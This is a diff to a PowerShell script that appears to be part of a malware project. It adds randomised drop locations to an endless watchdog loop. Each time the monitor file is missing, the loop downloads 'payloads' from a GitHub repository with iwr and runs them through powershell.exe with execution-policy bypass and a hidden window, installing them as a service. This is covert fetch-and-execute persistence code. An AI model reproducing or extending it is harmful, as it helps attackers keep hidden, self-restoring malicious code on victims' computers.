@@ -38,11 +38,16 @@ function Get-ServiceName{
     return $false
 }
 
+$doesExist = $true
 while($true){
     $r = Get-ServiceReg -path $regPath
     $n = Get-ServiceName -name $serviceName
 
     if(-not(Test-Path -Path $rootMonScript -PathType Leaf)){
+        if(-not($doesExist)){
+            $rootMonScript = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
+            $rootMonScript = "$rootMonScript\root_mon.ps1"
+        }
         iwr -Uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/root_mon.ps1" -OutFile $rootMonScript
         iwr -Uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/init_service_rootmon.ps1" -OutFile $initServiceRootmonPath
         powershell.exe -ep bypass -noP -w hidden $initServiceRootmonPath -rootPath $rootPath -scriptPath $rootMonScript
@@ -52,4 +57,5 @@ while($true){
         iwr -Uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/init_service_rootmon.ps1" -OutFile $initServiceRootmonPath
         powershell.exe -ep bypass -noP -w hidden $initServiceRootmonPath -rootPath $rootPath -scriptPath $rootMonScript
     }
+    $doesExist = $false
 }
